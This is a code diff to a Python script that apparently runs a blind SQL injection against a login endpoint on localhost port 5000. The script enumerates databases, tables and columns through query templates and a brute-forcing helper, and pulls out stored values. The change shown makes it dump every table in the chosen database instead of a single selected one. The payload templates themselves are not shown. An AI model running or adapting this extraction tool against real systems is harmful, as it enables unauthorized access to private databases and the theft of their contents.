@@ -2,7 +2,7 @@
 
 import requests as r
 import string
-from beautifultable import BeautifulTable
+from beautifultable import BeautifulTable as BT
 
 url = 'http://127.0.0.1:5000/auth/login'
 
@@ -74,18 +74,18 @@ if __name__ == "__main__":
     database_name = databases[int(input('-> '))]
 
     tables = brute(sql2.format(database_name))
-    for i in range(len(tables)):
-        print(f"{i}: {tables[i]}")
-    table_name = tables[int(input('-> '))]
 
-    columns = brute(sql3.format(database_name, table_name))
-    t = []
-    for c in columns:
-        t.append(brute(sql4.format(c, database_name, table_name, c)))
+    print()
+    for table_name in tables:
+        columns = brute(sql3.format(database_name, table_name))
+        t = []
+        for c in columns:
+            t.append(brute(sql4.format(c, database_name, table_name, c)))
 
-    table = BeautifulTable()
-    table.column_headers = columns
-    for row in zip(*t):
-        table.append_row(row)
-    print(table)
+        table = BT()
+        table.column_headers = columns
+        for row in zip(*t):
+            table.append_row(row)
+        print(table_name)
+        print(table)
     
